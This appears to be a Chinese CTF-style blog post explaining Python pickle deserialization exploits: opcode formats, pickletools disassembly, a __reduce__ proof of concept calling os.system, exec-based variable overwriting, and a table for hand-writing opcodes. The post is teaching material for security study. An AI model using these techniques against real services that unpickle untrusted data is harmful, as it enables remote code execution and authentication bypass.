+<h1 id="opcode最好用0版本的"><a href="#opcode最好用0版本的" class="headerlink" title="opcode最好用0版本的"></a>opcode最好用0版本的</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">a=&#123;<span class="string">&#x27;1&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;2&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;# 原变量：<span class="subst">&#123;a!r&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;pickle版本<span class="subst">&#123;i&#125;</span>&#x27;</span>,pickle.dumps(a,protocol=i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出：</span></span><br><span class="line">pickle版本<span class="number">0</span> <span class="string">b&#x27;(dp0\nV1\np1\nI1\nsV2\np2\nI2\ns.&#x27;</span></span><br><span class="line">pickle版本<span class="number">1</span> <span class="string">b&#x27;&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span></span><br><span class="line">pickle版本<span class="number">2</span> <span class="string">b&#x27;\x80\x02&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span></span><br><span class="line">pickle版本<span class="number">3</span> <span class="string">b&#x27;\x80\x03&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>pickle3版本的opcode示例：</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x27;abcd&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\x80\x03X\x04\x00\x00\x00abcdq\x00.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># \x80：协议头声明 \x03：协议版本</span></span><br><span class="line"><span class="comment"># \x04\x00\x00\x00：数据长度：4</span></span><br><span class="line"><span class="comment"># abcd：数据</span></span><br><span class="line"><span class="comment"># q：储存栈顶的字符串长度：一个字节（即\x00）</span></span><br><span class="line"><span class="comment"># \x00：栈顶位置</span></span><br><span class="line"><span class="comment"># .：数据截止</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="pickletools"><a href="#pickletools" class="headerlink" title="pickletools"></a>pickletools</h1><ul>
+<li>使用pickletools可以方便的将opcode转化为便于肉眼读取的形式</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">data=<span class="string">b&quot;\x80\x03cbuiltins\nexec\nq\x00X\x13\x00\x00\x00key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;q\x01\x85q\x02Rq\x03.&quot;</span></span><br><span class="line">pickletools.dis(data)</span><br><span class="line"></span><br><span class="line">    <span class="number">0</span>: \x80 PROTO      <span class="number">3</span></span><br><span class="line">    <span class="number">2</span>: c    GLOBAL     <span class="string">&#x27;builtins exec&#x27;</span></span><br><span class="line">   <span class="number">17</span>: q    BINPUT     <span class="number">0</span></span><br><span class="line">   <span class="number">19</span>: X    BINUNICODE <span class="string">&quot;key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;&quot;</span></span><br><span class="line">   <span class="number">43</span>: q    BINPUT     <span class="number">1</span></span><br><span class="line">   <span class="number">45</span>: \x85 TUPLE1</span><br><span class="line">   <span class="number">46</span>: q    BINPUT     <span class="number">2</span></span><br><span class="line">   <span class="number">48</span>: R    REDUCE</span><br><span class="line">   <span class="number">49</span>: q    BINPUT     <span class="number">3</span></span><br><span class="line">   <span class="number">51</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><ul>
+<li>任意代码执行或命令执行。</li>
+<li>变量覆盖，通过覆盖一些凭证达到绕过身份验证的目的。</li>
+</ul>
+<h3 id="初步认识：pickle-EXP的简单demo"><a href="#初步认识：pickle-EXP的简单demo" class="headerlink" title="初步认识：pickle EXP的简单demo"></a>初步认识：pickle EXP的简单demo</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">genpoc</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        s = <span class="string">&quot;&quot;&quot;echo test &gt;poc.txt&quot;&quot;&quot;</span>  <span class="comment"># 要执行的命令</span></span><br><span class="line">        <span class="keyword">return</span> os.system, (s,)        <span class="comment"># reduce函数必须返回元组或字符串</span></span><br><span class="line"></span><br><span class="line">e = genpoc()</span><br><span class="line">poc = pickle.dumps(e)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(poc) <span class="comment"># 此时，如果 pickle.loads(poc)，就会执行命令</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>变量覆盖</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">key1 = <span class="string">b&#x27;321&#x27;</span></span><br><span class="line">key2 = <span class="string">b&#x27;123&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">pickle_a = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(pickle_a)</span><br><span class="line">pickle.loads(pickle_a)</span><br><span class="line"><span class="built_in">print</span>(key1, key2)</span><br></pre></td></tr></table></figure>
+
+<h3 id="如何手写opcode"><a href="#如何手写opcode" class="headerlink" title="如何手写opcode"></a>如何手写opcode</h3><ul>
+<li>在CTF中，很多时候需要一次执行多个函数或一次进行多个指令，此时就不能光用 <code>__reduce__</code> 来解决问题（reduce一次只能执行一个函数，当exec被禁用时，就不能一次执行多条指令了），而需要手动拼接或构造opcode了。手写opcode是pickle反序列化比较难的地方。</li>
+<li>在这里可以体会到为何pickle<strong>是一种语言</strong>，直接编写的opcode灵活性比使用pickle序列化生成的代码更高，只要符合pickle语法，就可以进行变量覆盖、函数执行等操作。</li>
+<li>根据前文不同版本的opcode可以看出，版本0的opcode更方便阅读，所以手动编写时，一般选用版本0的opcode。下文中，所有opcode为版本0的opcode。</li>
+</ul>
+<h1 id="常用opcode"><a href="#常用opcode" class="headerlink" title="常用opcode"></a>常用opcode</h1><table>
+<thead>
+<tr>
+<th>opcode</th>
+<th>描述</th>
+<th>具体写法</th>
+<th>栈上的变化</th>
+<th>memo上的变化</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>c</td>
+<td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td>
+<td>c[module]\n[instance]\n</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>o</td>
+<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
+<td>o</td>
+<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>i</td>
+<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
+<td>i[module]\n[callable]\n</td>
+<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>N</td>
+<td>实例化一个None</td>
+<td>N</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>S</td>
+<td>实例化一个字符串对象</td>
+<td>S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>V</td>
+<td>实例化一个UNICODE字符串对象</td>
+<td>Vxxx\n</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>I</td>
+<td>实例化一个int对象</td>
+<td>Ixxx\n</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>F</td>
+<td>实例化一个float对象</td>
+<td>Fx.x\n</td>
+<td>获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>R</td>
+<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
+<td>R</td>
+<td>函数和参数出栈，函数的返回值入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>.</td>
+<td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
+<td>.</td>
+<td>无</td>
+<td>无</td>
+</tr>
+<tr>
+<td>(</td>
+<td>向栈中压入一个MARK标记</td>
+<td>(</td>
+<td>MARK标记入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>t</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>
+<td>t</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>)</td>
+<td>向栈中直接压入一个空元组</td>
+<td>)</td>
+<td>空元组入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>l</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>
+<td>l</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>]</td>
+<td>向栈中直接压入一个空列表</td>
+<td>]</td>
+<td>空列表入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>d</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
+<td>d</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>}</td>
+<td>向栈中直接压入一个空字典</td>
+<td>}</td>
+<td>空字典入栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>p</td>
+<td>将栈顶对象储存至memo_n</td>
+<td>pn\n</td>
+<td>无</td>
+<td>对象被储存</td>
+</tr>
+<tr>
+<td>g</td>
+<td>将memo_n的对象压栈</td>
+<td>gn\n</td>
+<td>对象被压栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>0</td>
+<td>丢弃栈顶对象</td>
+<td>0</td>
+<td>栈顶对象被丢弃</td>
+<td>无</td>
+</tr>
+<tr>
+<td>b</td>
+<td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
+<td>b</td>
+<td>栈上第一个元素出栈</td>
+<td>无</td>
+</tr>
+<tr>
+<td>s</td>
+<td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
+<td>s</td>
+<td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
+<td>无</td>
+</tr>
+<tr>
+<td>u</td>
+<td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
+<td>u</td>
+<td>MARK标记以及被组合的数据出栈，字典被更新</td>
+<td>无</td>
+</tr>
+<tr>
+<td>a</td>
+<td>将栈的第一个元素append到第二个元素(列表)中</td>
+<td>a</td>
+<td>栈顶元素出栈，第二个元素（列表）被更新</td>
+<td>无</td>
+</tr>
+<tr>
+<td>e</td>
+<td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
+<td>e</td>
+<td>MARK标记以及被组合的数据出栈，列表被更新</td>
+<td>无</td>
+</tr>
+</tbody></table>
+<p>此外， <code>TRUE</code> 可以用 <code>I</code> 表示： <code>b&#39;I01\n&#39;</code> ； <code>FALSE</code> 也可以用 <code>I</code> 表示： <code>b&#39;I00\n&#39;</code> ，其他opcode可以在<a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/master/Lib/pickle.py#L111">pickle库的源代码</a>中找到。<br>由这些opcode我们可以得到一些需要注意的地方：</p>
+<ul>
+<li>编写opcode时要想象栈中的数据，以正确使用每种opcode。</li>
+<li>在理解时注意与python本身的操作对照（比如python列表的<code>append</code>对应<code>a</code>、<code>extend</code>对应<code>e</code>；字典的<code>update</code>对应<code>u</code>）。</li>
+<li><code>c</code>操作符会尝试<code>import</code>库，所以在<code>pickle.loads</code>时不需要漏洞代码中先引入系统库。</li>
+<li>pickle不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。pickle能够索引查值的操作只有<code>c</code>、<code>i</code>。而如何查值也是CTF的一个重要考点。</li>
+<li><code>s</code>、<code>u</code>、<code>b</code>操作符可以构造并赋值原来没有的属性、键值对。</li>
+</ul>
+<h4 id="拼接opcode"><a href="#拼接opcode" class="headerlink" title="拼接opcode"></a>拼接opcode</h4><p>将第一个pickle流结尾表示结束的 <code>.</code> 去掉，将第二个pickle流与第一个拼接起来即可。</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by void2eye, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/Web/" class="tag">#Web</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2024/02/26/pickle_rce%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">Pickle RCE 注意事项</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2024/02/26/python_%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95%E5%88%A9%E7%94%A8%E6%B3%A8%E6%84%8F/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">Python 魔法方法利用注意</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        <div class="container">
+            <div id="waline"></div>
+            <script>
+                new Waline({
+                    el: "#waline",
+                    
+                    path: location.pathname,
+                    
+                    serverURL: https://blogcomment-blond.vercel.app/,
+                    
+                    requiredMeta: ['nick'],
+                    
+                });
+            </script>
+        </div>
+        
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/void2eye/Registration-tool-automatic-submission-script" class="item">RE_tools</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a href="mailto:2110027730@qq.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 void2eye<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        <br>
+        <span class="footer-extra-description"><a href="https://beian.miit.gov.cn/" target="_blank">浙ICP备2024135394号</a></span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
